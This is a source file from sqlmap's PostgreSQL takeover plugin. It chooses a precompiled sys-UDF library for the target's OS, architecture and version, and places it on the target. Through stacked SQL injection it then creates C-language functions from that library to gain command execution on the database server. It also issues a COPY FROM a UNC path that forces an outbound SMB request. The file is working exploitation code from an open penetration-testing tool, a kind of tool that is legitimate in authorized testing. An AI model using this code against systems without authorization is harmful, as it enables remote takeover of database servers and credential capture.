#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.common import Backend
from lib.core.common import randomStr
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.enums import OS
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.request import inject

from plugins.generic.takeover import Takeover as GenericTakeover

class Takeover(GenericTakeover):
    def __init__(self):
        GenericTakeover.__init__(self)

    def udfSetRemotePath(self):
        # On Windows
        if Backend.isOs(OS.WINDOWS):
            # The DLL can be in any folder where postgres user has
            # read/write/execute access is valid
            # NOTE: by not specifing any path, it will save into the
            # data directory, on PostgreSQL 8.3 it is
            # C:\Program Files\PostgreSQL\8.3\data.
            self.udfRemoteFile = "%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)

        # On Linux
        else:
            # The SO can be in any folder where postgres user has
            # read/write/execute access is valid
            self.udfRemoteFile = "/tmp/%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)

    def udfSetLocalPaths(self):
        self.udfLocalFile = paths.SQLMAP_UDF_PATH
        self.udfSharedLibName = "libs%s" % randomStr(lowercase=True)

        self.getVersionFromBanner()

        banVer = kb.bannerFp["dbmsVersion"]

        if banVer >= "9.0":
            majorVer = "9.0"
        elif banVer >= "8.4":
            majorVer = "8.4"
        elif banVer >= "8.3":
            majorVer = "8.3"
        elif banVer >= "8.2":
            majorVer = "8.2"
        else:
            errMsg = "unsupported feature on versions of PostgreSQL before 8.2"
            raise sqlmapUnsupportedFeatureException, errMsg

        if Backend.isOs(OS.WINDOWS):
            self.udfLocalFile += "/postgresql/windows/%d/%s/lib_postgresqludf_sys.dll" % (Backend.getArch(), majorVer)
            self.udfSharedLibExt = "dll"
        else:
            self.udfLocalFile += "/postgresql/linux/%d/%s/lib_postgresqludf_sys.so" % (Backend.getArch(), majorVer)
            self.udfSharedLibExt = "so"

    def udfCreateFromSharedLib(self, udf, inpRet):
        if udf in self.udfToCreate:
            logger.info("creating UDF '%s' from the binary UDF file" % udf)

            inp = ", ".join(i for i in inpRet["input"])
            ret = inpRet["return"]

            # Reference: http://www.postgresql.org/docs/8.3/interactive/sql-createfunction.html
            inject.goStacked("DROP FUNCTION %s(%s)" % (udf, inp))
            inject.goStacked("CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE" % (udf, inp, ret, self.udfRemoteFile, udf))

            self.createdUdf.add(udf)
        else:
            logger.debug("keeping existing UDF '%s' as requested" % udf)

    def uncPathRequest(self):
        self.createSupportTbl(self.fileTblName, self.tblField, "text")
        inject.goStacked("COPY %s(%s) FROM '%s'" % (self.fileTblName, self.tblField, self.uncPath), silent=True)
        self.cleanup(onlyFileTbl=True)
